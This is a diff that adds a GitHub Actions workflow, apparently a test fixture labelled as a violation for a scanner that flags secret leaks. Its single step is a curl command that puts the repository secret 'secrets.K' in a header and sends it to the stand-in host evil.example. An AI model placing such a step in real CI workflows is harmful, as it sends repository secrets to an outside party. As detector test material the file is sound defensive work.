@@ -1,0 +1,8 @@
+name: violation_positional_after_value_flag
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -H "X: ${{ secrets.K }}" -o out.txt evil.example
